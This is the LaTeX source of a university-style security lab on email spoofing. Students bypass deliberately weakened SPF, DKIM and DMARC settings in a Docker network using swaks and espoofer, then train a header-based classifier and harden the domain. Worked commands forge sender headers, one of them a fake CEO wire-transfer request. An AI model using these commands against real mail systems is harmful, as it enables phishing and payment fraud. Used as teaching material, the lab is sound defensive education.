%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Email Spoofing & ML-Based Detection Lab                        %%
%%  Based on the SEED Labs template by Wenliang Du                 %%
%%  Creative Commons Attribution-NonCommercial-ShareAlike 4.0      %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\documentclass[11pt]{article}

%% ── Packages ──────────────────────────────────────────────────────
\usepackage{geometry}
% setting the geometry
\geometry{
	top=1in,
	bottom=0.5in,
	left=0.85in,
	right=0.85in,
%	header=0.75in,
%	footer=0.5in
}

\usepackage{fancyhdr}
\usepackage{listings}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{graphicx}
\usepackage{titlesec}
\usepackage{parskip}
\usepackage{booktabs}
\usepackage{caption}
\usepackage{mdframed}
\usepackage{minted}
\usepackage{setspace}
\usepackage{tabularx}
\usepackage{array}

%% ── Listings style (monospaced code boxes) ────────────────────────
\lstset{
  basicstyle=\ttfamily\small,
  backgroundcolor=\color{gray!10},
  frame=single,
  framerule=0.4pt,
  rulecolor=\color{gray!60},
  breaklines=true,
  breakatwhitespace=true,
  showstringspaces=false,
  tabsize=4,
  xleftmargin=6pt,
  xrightmargin=6pt,
  aboveskip=6pt,
  belowskip=6pt,
}

\definecolor{bg}{rgb}{0.95, 0.95, 0.95}
\usemintedstyle{native}
\setminted{
    linenos,
    frame=none,
    numbersep=6pt,
    framesep=2mm,
    bgcolor=bg,
    fontsize=\large,
    xleftmargin=\parindent
}

%% ── Headers / footers ─────────────────────────────────────────────
\pagestyle{fancy}
\fancyhf{}
\lhead{\bfseries SEED Labs -- Email Spoofing \& ML Detection Lab}
\rhead{\thepage}
\renewcommand{\headrulewidth}{0.4pt}

%% ── Task counter ──────────────────────────────────────────────────
\newcounter{task}
\setcounter{task}{1}
\newcommand{\tasks}{%
  \textbf{(\arabic{task})}\addtocounter{task}{1}\,}

%% ── Note / warning box ────────────────────────────────────────────
\newmdenv[
  linecolor=orange!70,
  backgroundcolor=orange!8,
  linewidth=1pt,
  innerleftmargin=8pt,
  innerrightmargin=8pt,
  innertopmargin=6pt,
  innerbottommargin=6pt,
]{notebox}

\newmdenv[
  linecolor=blue!50,
  backgroundcolor=blue!5,
  linewidth=1pt,
  innerleftmargin=8pt,
  innerrightmargin=8pt,
  innertopmargin=6pt,
  innerbottommargin=6pt,
]{infobox}

%% ══════════════════════════════════════════════════════════════════
\begin{document}
%% ══════════════════════════════════════════════════════════════════

\begin{center}
  {\LARGE\bfseries Email Spoofing \& ML-Based Detection Lab}\\[6pt]
  {\large Exploiting SPF, DKIM, and DMARC --- and Building a Defence}
\end{center}

\vspace{4pt}
\noindent\rule{\linewidth}{0.6pt}
\vspace{4pt}

\noindent
Copyright \textcopyright{} 2026.
This lab is released under the
\href{http://creativecommons.org/licenses/by-nc-sa/4.0/}{Creative
Commons Attribution-NonCommercial-ShareAlike 4.0 International License}.

\vspace{8pt}

%% ══════════════════════════════════════════════════════════════════
\section{Overview}
%% ══════════════════════════════════════════════════════════════════

Email remains one of the most widely abused communication channels for
impersonation and phishing attacks.
Over the last two decades, three authentication protocols have been
standardised to combat email sender spoofing:
\textbf{SPF} (Sender Policy Framework),
\textbf{DKIM} (DomainKeys Identified Mail), and
\textbf{DMARC} (Domain-based Message Authentication, Reporting and
Conformance).
Despite their widespread adoption, real-world deployments are riddled
with misconfigurations and implementation weaknesses that allow a
determined attacker to bypass all three layers simultaneously.

This lab has two complementary objectives:

\begin{enumerate}[noitemsep]
  \item \textbf{Attack.} Students will exploit deliberate
    misconfigurations in a controlled email infrastructure to deliver
    spoofed messages that pass (or are not rejected by) SPF, DKIM, and
    DMARC checks.
  \item \textbf{Defend.} Students will train and evaluate a
    machine-learning classifier that analyses email headers and metadata
    to flag spoofed messages, providing a last line of defence when
    protocol-level checks fail.
\end{enumerate}

\paragraph{Topics covered.}
\begin{itemize}[noitemsep]
  \item How SPF, DKIM, and DMARC work and interact
  \item Common misconfigurations that enable spoofing (soft-fail SPF,
    missing DKIM, DMARC \texttt{p=none})
  \item Direct MTA attacks using \texttt{swaks} and \texttt{espoofer}
  \item Header-injection and envelope/header \texttt{From} mismatch
    attacks
  \item Feature engineering from email headers for ML-based detection
  \item Evaluating a classifier against known spoofing patterns
\end{itemize}

\paragraph{Readings.}
\begin{itemize}[noitemsep]
  \item RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
  \item J.\ Chen, V.\ Paxson, J.\ Jiang ---
    \textit{Composition Kills: A Case Study of Email Sender
    Authentication}, USENIX Security 2020
    (included in \texttt{containers\_setup/espoofer/papers/})
  \item \url{https://github.com/chenjj/espoofer} --- \texttt{espoofer} tool
    documentation
\end{itemize}

\paragraph{Lab Environment.}
All tasks run inside a Docker Compose network (\texttt{net-10.9.0.0/24})
that you will set up using the provided scripts.
No external Internet access is required for the attack tasks.
A host machine with Docker and Docker Compose installed is sufficient.
This lab has been developed and tested on the official SEED Labs
Ubuntu~20.04 virtual machine.

%% ══════════════════════════════════════════════════════════════════
\section{Lab Environment}
%% ══════════════════════════════════════════════════════════════════

\subsection{Container Architecture}

The lab uses four containers connected on the \texttt{10.9.0.0/24}
subnet.
Table~\ref{tab:containers} summarises each container's role.

\begin{table}[h]
\centering
\caption{Docker containers and their roles}
\label{tab:containers}
\begin{tabularx}{\textwidth}{@{} l l l >{\raggedright\arraybackslash}X @{}}
\toprule
\textbf{Container} & \textbf{IP} & \textbf{Image} & \textbf{Role} \\
\midrule
\texttt{dns-server-10.9.0.5}
  & \texttt{10.9.0.5}
  & Custom BIND9
  & Authoritative DNS for both domains \\
\texttt{victim-mail-10.9.0.6}
  & \texttt{10.9.0.6}
  & \texttt{docker-mailserver}
  & Postfix/Dovecot mail server (\texttt{victim.test}) \\
\texttt{attacker-sender-10.9.0.7}
  & \texttt{10.9.0.7}
  & \texttt{seed-ubuntu:large}
  & Attack workstation \\
\bottomrule
\end{tabularx}
\end{table}


\paragraph{DNS zones.}
Two DNS zones are served by the BIND9 container:

\begin{itemize}[noitemsep]
  \item \textbf{\texttt{victim.test}} --- the target domain, configured
    with intentional weaknesses: SPF soft-fail (\texttt{\textasciitilde
    all}), no DKIM selector published, and DMARC policy
    \texttt{p=none} (monitoring only).
  \item \textbf{\texttt{attacker.test}} --- the attacker's domain, with
    a valid SPF record authorising \texttt{10.9.0.7}, a DKIM public key,
    and a permissive DMARC record.
\end{itemize}

\paragraph{Mail accounts.}
The victim mail server hosts two accounts:
\begin{listing}[H]
\begin{minted}{text}
alice@victim.test   password: pass123
bob@victim.test     password: 123pass
user@victim.test    (hashed, for postfix-accounts.cf)
\end{minted}
\end{listing}

\begin{listing}[H]
\begin{minted}{text}
# Exposed ports (host machine)
SMTP:  localhost:2525  ->  victim-mail:25
IMAP:  localhost:1143  ->  victim-mail:143
\end{minted}
\end{listing}

\subsection{Setup and Commands}

\paragraph{Step 1 --- Start the containers.}
From the root of the \texttt{containers\_setup} directory:

\begin{listing}[H]
\begin{minted}{text}
$ dcdown          # to bring down running containers, if needed
$ dcup -d                    
$ dockps          # verify all three containers are running
\end{minted}
\end{listing}

\paragraph{Step 2 --- Run the first-time initialisation script.}
Open a shell inside the attacker container and run the setup script
\emph{once}:

\begin{listing}[H]
\begin{minted}{text}
$ docksh attacker-sender-10.9.0.7
(attacker)$ cd /home/seed/init_setup
(attacker)$ bash run-me-1st.sh
\end{minted}
\end{listing}

This script updates the system, installs \texttt{swaks}, and installs
the Python dependencies required by \texttt{espoofer}.

\paragraph{Step 3 --- Verify DNS resolution.}
Still inside the attacker container, confirm that the custom DNS server
is resolving both zones correctly:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ dig MX victim.test @10.9.0.5
(attacker)$ dig TXT victim.test @10.9.0.5
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5
\end{minted}
\end{listing}

\paragraph{Stopping the lab.}
\begin{listing}[H]
\begin{minted}{text}
$ dcdown
\end{minted}    

\end{listing}

%% ══════════════════════════════════════════════════════════════════
\section{Task 1: Understanding SPF, DKIM, and DMARC}
%% ══════════════════════════════════════════════════════════════════

Before launching any attacks, students must understand what each
protocol does and how they interact.

\subsection{Task 1.1 --- Inspecting DNS Records}

From inside the attacker container (or from the host using
\texttt{dig} with \texttt{@10.9.0.5}), retrieve and interpret the
DNS records for both domains.

\begin{listing}[H]
\begin{minted}{text}
# SPF record for victim.test
(attacker)$ dig TXT victim.test @10.9.0.5

# DMARC record for victim.test
(attacker)$ dig TXT _dmarc.victim.test @10.9.0.5

# SPF record for attacker.test
(attacker)$ dig TXT attacker.test @10.9.0.5

# DKIM public key for attacker.test
(attacker)$ dig TXT selector._domainkey.attacker.test @10.9.0.5
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What is the SPF policy for \texttt{victim.test}?
    Does it use \texttt{-all} (hard-fail) or \texttt{\textasciitilde
    all} (soft-fail)?
    What is the practical difference?
  \item Is there a DKIM selector published for \texttt{victim.test}?
    What happens when a receiver tries to verify a DKIM signature from
    this domain?
  \item What does \texttt{p=none} in the DMARC record mean from a
    deliverability standpoint?
  \item How is the attacker's SPF record different from the victim's?
    Why does this matter?
\end{enumerate}

\subsection{Task 1.2 --- Sending a Legitimate Email}

Use \texttt{swaks} to send a legitimate email from
\texttt{alice@victim.test} to \texttt{bob@victim.test} through the
victim mail server, and inspect the received headers.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
    --from alice@victim.test \
    --to   bob@victim.test \    
    --server 10.9.0.6 --port 25 \
    --header "Subject: Legitimate test" \
    --body   "This is a legitimate message."
\end{minted}
\end{listing}

Retrieve the message using IMAP (e.g.\ \texttt{mutt} or \texttt{curl})
and examine the \texttt{Authentication-Results} and
\texttt{Received-SPF} headers.

\begin{listing}[H]
\begin{minted}{text}
# Retrieve headers via curl (IMAP)
$ curl -s "imap://bob@localhost:1143/INBOX" \
    --user "bob:123pass" -X "FETCH 1 RFC822.HEADER"
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What \texttt{spf=} result is shown in the
    \texttt{Authentication-Results} header?
  \item Is there a \texttt{dkim=} result? Why or why not?
  \item What is the \texttt{dmarc=} result, and why is the email still
    delivered despite any failures?
\end{enumerate}

%% ══════════════════════════════════════════════════════════════════
\section{Task 2: SPF Bypass Attack}
%% ══════════════════════════════════════════════════════════════════

SPF checks the \textbf{envelope sender} (the \texttt{MAIL FROM} address
passed during the SMTP transaction), not the \texttt{From:} header that
users see in their email client.
This mismatch is a well-known vector for spoofing.

\subsection{Task 2.1 --- Direct MTA Spoofing with \texttt{swaks}}

Use the pre-built attack script to send a spoofed email.
The script sets the SMTP envelope sender to a legitimate-looking address
while identifying itself with the attacker's HELO domain.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ cd /home/seed/attacks
(attacker)$ bash attack.sh attacker@victim.test bob@victim.test "SPF Test"
\end{minted}
\end{listing}

The script performs three operations: it sends the spoofed email
(\texttt{swaks}), captures network traffic (\texttt{tcpdump}), and
prints the SMTP transaction log.

\paragraph{Manual variant.}
You can also craft the attack manually to better understand the envelope
vs.\ header distinction:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
    --from    attacker@victim.test \
    --to      bob@victim.test \
    --server  10.9.0.6 --port 25 \
    --helo    attacker.attacker.test \
    --header  "From: CEO <ceo@victim.test>" \
    --header  "Subject: Urgent: Please wire funds" \
    --body    "Please transfer $10,000 immediately."
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item What does the recipient (\texttt{bob}) see as the
    \texttt{From:} address in his mail client?
  \item What does the SPF check evaluate --- the \texttt{From:} header
    or the SMTP \texttt{MAIL FROM}?
  \item Does the email reach \texttt{bob}'s inbox?
    Examine the \texttt{Received-SPF} header and explain the result.
  \item What configuration change to the victim's SPF record would
    cause this email to be rejected outright?
\end{enumerate}

\subsection{Task 2.2 --- Envelope/Header \texttt{From} Mismatch}

In this variant, you align the SMTP \texttt{MAIL FROM} with a domain
you control (\texttt{attacker.test}), while placing a spoofed address
in the \texttt{From:} header visible to the user.
This causes SPF to \emph{pass} (the envelope sender is legitimate),
even though the displayed sender is forged.

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ swaks \
    --from    attacker@attacker.test \
    --to      bob@victim.test \
    --server  10.9.0.6 --port 25 \
    --helo    attacker.test \
    --header  "From: Alice <alice@victim.test>" \
    --header  "Subject: Meeting rescheduled" \
    --body    "Hi Bob, our meeting is now at 3pm."
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Does SPF pass in this case?  Explain why.
  \item What is the DMARC \emph{alignment} check, and does this message
    pass it?
  \item What DMARC policy would cause this message to be quarantined or
    rejected?
\end{enumerate}

%% ══════════════════════════════════════════════════════════════════
\section{Task 3: DKIM and DMARC Bypass with \texttt{espoofer}}
%% ══════════════════════════════════════════════════════════════════

\texttt{espoofer} is a research tool that implements a catalogue of
known email-sender-authentication bypass techniques discovered by Chen,
Paxson, and Jiang (USENIX Security 2020).
It operates in three modes: \textit{server}, \textit{client}, and
\textit{manual}.
In this lab we use \textit{server} mode, where \texttt{espoofer} acts
as the sending MTA.

\subsection{Task 3.1 --- Exploring Available Attack Cases}

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ cd /home/seed/espoofer
(attacker)$ python3 espoofer.py -l
\end{minted}
\end{listing}

This lists all built-in attack cases. Note the case identifiers
(e.g.\ \texttt{server\_a1}, \texttt{server\_a2}, \ldots).

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item How many distinct server-mode attack cases are available?
  \item Pick three cases and describe in your own words what
    authentication property each one exploits.
\end{enumerate}

\subsection{Task 3.2 --- Configuring \texttt{espoofer}}

Edit \texttt{/home/seed/espoofer/config.py} to target the lab
infrastructure:

\begin{listing}[H]
\begin{minted}{text}
config = {
    "attacker_site": b"attacker.test",
    "legitimate_site_address": b"admin@victim.test",  # spoofed From:
    "victim_address": b"bob@victim.test",             # target inbox
    "case_id": b"server_a1",                 # change to test others

    "server_mode": {
        "recv_mail_server": "10.9.0.6",
        "recv_mail_server_port": 25,
        "starttls": False,
    },
}
\end{minted}
\end{listing}

\subsection{Task 3.3 --- Running the Attack}

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ python3 espoofer.py          # uses config.py settings
# OR override case_id on the command line:
(attacker)$ python3 espoofer.py -id server_a2
\end{minted}
\end{listing}

Retrieve the message from \texttt{bob}'s inbox and examine the
\texttt{Authentication-Results} header.

\paragraph{Questions (repeat for at least 3 different case IDs).}
\begin{enumerate}[noitemsep]
  \item Which attack case(s) result in \texttt{dmarc=pass}?
  \item What does the \texttt{From:} header look like to Bob in each
    case?
  \item For cases that fail (email rejected or flagged), what specific
    check causes the failure?
  \item Describe, in protocol terms, why the ``cocktail'' approach
    (combining multiple bypass techniques) is more effective than any
    single technique alone.
\end{enumerate}

\subsection{Task 3.4 --- Manual Mode Attack}

Use manual mode to craft a raw spoofed message with full control over
every header field:

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ python3 espoofer.py -m m \
    -helo attacker.test \
    -mfrom attacker@attacker.test \
    -rcptto bob@victim.test \
    -ip 10.9.0.6 -port 25 \
    -data \
    "From: Alice <alice@victim.test>\r\nSubject: Spoofing\r\n\r\nBody here."
\end{minted}
\end{listing}

\paragraph{Question.}
Explain what each flag controls at the SMTP protocol level and how it
relates to SPF, DKIM, or DMARC verification.

%% ══════════════════════════════════════════════════════════════════
\section{Task 4: Analysing Attack Artefacts}
%% ══════════════════════════════════════════════════════════════════

The \texttt{attack.sh} script captures SMTP traffic and saves it to
log files.
This task asks you to analyse those artefacts to build intuition for
the features a detection system might use.

\subsection{Task 4.1 --- Examining SMTP Logs}

\begin{listing}[H]
\begin{minted}{text}
(attacker)$ cat /home/seed/attacks/spf-spoof-attack.log
\end{minted}
\end{listing}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item List the SMTP commands exchanged during the spoofed session
    (e.g.\ \texttt{EHLO}, \texttt{MAIL FROM}, \texttt{RCPT TO},
    \texttt{DATA}).
  \item What information in the SMTP transaction reveals that the
    envelope sender and the \texttt{From:} header are mismatched?
  \item Which fields in the full message headers would be most useful
    for an automated detector?
    Consider: \texttt{Received}, \texttt{Authentication-Results},
    \texttt{Received-SPF}, \texttt{DKIM-Signature}, \texttt{Return-Path},
    and \texttt{From}.
\end{enumerate}

\subsection{Task 4.2 --- Header Feature Inventory}

Collect the raw headers of at least \textbf{five} spoofed emails
(from Tasks~2 and~3) and at least \textbf{five} legitimate emails
(from Task~1.2).
For each email, record the values in Table~\ref{tab:features}.

\begin{table}[h]
\centering
\caption{Header feature inventory (fill in during lab)}
\label{tab:features}
\begin{tabular}{lcccc}
\toprule
\textbf{Email} & \textbf{spf=} & \textbf{dkim=} & \textbf{dmarc=} &
\textbf{From $\neq$ Return-Path?} \\
\midrule
Legitimate 1 & & & & \\
Legitimate 2 & & & & \\
\ldots        & & & & \\
Spoofed 1    & & & & \\
Spoofed 2    & & & & \\
\ldots        & & & & \\
\bottomrule
\end{tabular}
\end{table}

%% ══════════════════════════════════════════════════════════════════
\section{Task 5: ML-Based Spoofing Detection}
%% ══════════════════════════════════════════════════════════════════

In this task, students build and evaluate a machine-learning classifier
that distinguishes spoofed emails from legitimate ones based on header
features.
This models a real-world \emph{last-line-of-defence} scenario, where
protocol-level checks have already been bypassed.

\subsection{Task 5.1 --- Dataset Preparation}

Collect the raw email headers from the emails generated in Tasks~1--4.
Supplement this with a publicly available labelled dataset
(e.g.\ the CEAS 2008 spam corpus, SpamAssassin public corpus, or a
dataset of your choice) to increase class balance.

For each email, extract the following features:

\begin{itemize}[noitemsep]
  \item \texttt{spf\_result} --- encoded as: \texttt{pass}=0,
    \texttt{softfail}=1, \texttt{fail}=2, \texttt{none}=3
  \item \texttt{dkim\_result} --- \texttt{pass}=0, \texttt{fail}=1,
    \texttt{none}=2
  \item \texttt{dmarc\_result} --- \texttt{pass}=0, \texttt{fail}=1,
    \texttt{none}=2
  \item \texttt{from\_return\_path\_mismatch} --- Boolean (1 if the
    domain in \texttt{From:} differs from \texttt{Return-Path:})
  \item \texttt{helo\_from\_mismatch} --- Boolean (1 if HELO domain
    differs from \texttt{From:} domain)
  \item \texttt{num\_received\_hops} --- count of \texttt{Received:}
    headers
  \item \texttt{has\_dkim\_signature} --- Boolean
  \item \texttt{reply\_to\_different\_domain} --- Boolean
\end{itemize}

\paragraph{Feature extraction hint.}
Python's \texttt{email} standard library can parse raw message files:

\begin{listing}[H]
\begin{minted}{text}
import email

with open("raw_message.eml", "r") as f:
    msg = email.message_from_file(f)

from_addr   = msg.get("From", "")
return_path = msg.get("Return-Path", "")
auth_results = msg.get("Authentication-Results", "")
\end{minted}
\end{listing}

\subsection{Task 5.2 --- Training the Classifier}

Train at least \textbf{one} of the following classifiers using
\texttt{scikit-learn}. Compare results if you train more than one.

\begin{itemize}[noitemsep]
  \item Random Forest (\texttt{RandomForestClassifier})
  \item Gradient Boosting (\texttt{GradientBoostingClassifier})
  \item Logistic Regression (\texttt{LogisticRegression})
  \item Support Vector Machine (\texttt{SVC})
\end{itemize}

Use an 80/20 train/test split and stratified cross-validation
(5-fold).

\begin{listing}[H]
\begin{minted}{text}
 from sklearn.ensemble import RandomForestClassifier
 from sklearn.model_selection import train_test_split, cross_val_score
 from sklearn.metrics import classification_report, confusion_matrix

 X_train, X_test, y_train, y_test = train_test_split(
     X, y, test_size=0.2, random_state=42, stratify=y)

 clf = RandomForestClassifier(n_estimators=100, random_state=42)
 clf.fit(X_train, y_train)

 y_pred = clf.predict(X_test)
 print(classification_report(y_test, y_pred,
       target_names=["Legitimate", "Spoofed"]))
 print(confusion_matrix(y_test, y_pred))
\end{minted}
\end{listing}

\subsection{Task 5.3 --- Evaluation and Analysis}

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Report precision, recall, F1-score, and accuracy for each
    classifier tested.
  \item Which features have the highest importance scores (for
    tree-based models)?
    Does this match your intuition from Task~4?
  \item What is the cost of a false negative (a spoofed email
    classified as legitimate) versus a false positive (a legitimate
    email flagged as spoofed) in a real deployment?
    How should this affect the choice of decision threshold?
  \item Describe at least two ways an attacker could craft a spoofed
    email that evades your classifier.
  \item What additional features or data sources could improve
    robustness?
\end{enumerate}

%% ══════════════════════════════════════════════════════════════════
\section{Task 6: Hardening the Victim Domain}
%% ══════════════════════════════════════════════════════════════════

Having successfully attacked the \texttt{victim.test} domain, this
final task asks you to fix the misconfigurations that made the attacks
possible.

\subsection{Task 6.1 --- SPF Hardening}

Edit the BIND zone file
\texttt{containers\_setup/bind/zones/db.victim.test} and change the SPF
record from soft-fail to hard-fail:

\begin{listing}[H]
\begin{minted}{text}
; Before (vulnerable):
@ IN TXT "v=spf1 mx ~all"

; After (hardened):
@ IN TXT "v=spf1 mx -all"
\end{minted}
\end{listing}

Restart the DNS container and re-run the SPF bypass attack from
Task~2.1.

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Does the email still reach Bob's inbox after the SPF change?
  \item What \texttt{Received-SPF} header value do you now observe?
  \item Does the envelope/header mismatch attack from Task~2.2 still
    succeed? Why or why not?
\end{enumerate}

\subsection{Task 6.2 --- Publishing a DKIM Key}

Generate a DKIM key pair for \texttt{victim.test} and publish the
public key in the DNS zone:

\begin{listing}[H]
\begin{minted}{text}
# Generate key pair (on the attacker container or host)
$ openssl genrsa -out dkim_private.pem 2048
$ openssl rsa -in dkim_private.pem -pubout -out dkim_public.pem

# Extract the base64 public key (single line, no headers)
$ grep -v '^-' dkim_public.pem | tr -d '\n'
\end{minted}
\end{listing}

Add the following record to \texttt{db.victim.test}
(replace \texttt{<PUBKEY>} with the output above):

\begin{listing}[H]
\begin{minted}{text}
default._domainkey IN TXT "v=DKIM1; k=rsa; p=<PUBKEY>"
\end{minted}
\end{listing}

Configure the victim mail server to sign outgoing mail with the private
key, then verify that a legitimate email now includes a valid
\texttt{DKIM-Signature} header.

\paragraph{Question.}
After publishing the DKIM key, which \texttt{espoofer} cases from
Task~3 are now blocked?
Are any still effective? Explain why.

\subsection{Task 6.3 --- DMARC Policy Enforcement}

Update the DMARC record to move from monitoring (\texttt{p=none}) to
enforcement:

\begin{listing}[H]
\begin{minted}{text}
; Quarantine policy (step towards full enforcement):
_dmarc IN TXT "v=DMARC1; p=quarantine; pct=100; aspf=s; adkim=s"

; Or full rejection:
_dmarc IN TXT "v=DMARC1; p=reject; pct=100; aspf=s; adkim=s"
\end{minted}
\end{listing}

Note the change from \texttt{aspf=r} (relaxed) to \texttt{aspf=s}
(strict) alignment, which requires the \texttt{From:} domain to
\emph{exactly} match the SPF/DKIM authenticated domain.

\paragraph{Questions.}
\begin{enumerate}[noitemsep]
  \item Re-run the attacks from Tasks~2 and~3 with the new DMARC
    policy. Which attacks are now blocked?
  \item What is the risk of moving directly to \texttt{p=reject}
    without first running in \texttt{p=none} mode for a period?
  \item Summarise the three-protocol hardening as a defence-in-depth
    diagram (a hand-drawn sketch in your report is acceptable).
\end{enumerate}

%% ══════════════════════════════════════════════════════════════════
\section{Submission}
%% ══════════════════════════════════════════════════════════════════

Students should submit a lab report in PDF format containing:

\begin{enumerate}[noitemsep]
  \item \textbf{Environment verification} --- screenshots of running
    containers (\texttt{docker compose ps}) and successful DNS
    resolution.
  \item \textbf{Task answers} --- all numbered questions answered with
    supporting evidence (terminal output, header excerpts, screenshots).
  \item \textbf{Attack logs} --- the contents of
    \texttt{spf-spoof-attack.log} and relevant
    \texttt{Authentication-Results} headers for at least three
    \texttt{espoofer} cases.
  \item \textbf{ML results} --- the full \texttt{classification\_report}
    output, a confusion matrix, and the feature importance plot (or
    coefficient table) for your classifier.
  \item \textbf{Hardening evidence} --- before/after zone file excerpts
    and re-run attack outputs showing the effect of each hardening step.
  \item \textbf{Reflection} --- a short paragraph (200--300 words)
    discussing the limitations of both protocol-level defences and the
    ML classifier, and what a production-grade solution would look like.
\end{enumerate}

\begin{notebox}
\textbf{Academic integrity notice.}
All attacks in this lab must be conducted exclusively within the
provided Docker network.
Do not attempt any of these techniques against real email infrastructure.
\end{notebox}

%% ══════════════════════════════════════════════════════════════════
\section{Acknowledgements}
%% ══════════════════════════════════════════════════════════════════

\begin{itemize}[noitemsep]
  \item The \texttt{espoofer} tool is developed by Jianjun Chen, Vern
    Paxson, and Jian Jiang and is available at
    \url{https://github.com/chenjj/espoofer}.
  \item The container infrastructure (DNS, mail server, and attacker
    workstation) was developed as part of the course project.
  \item The lab format is inspired by the SEED Security Lab series
    by Wenliang Du, Syracuse University
    (\url{https://seedsecuritylabs.org}).
\end{itemize}

\end{document}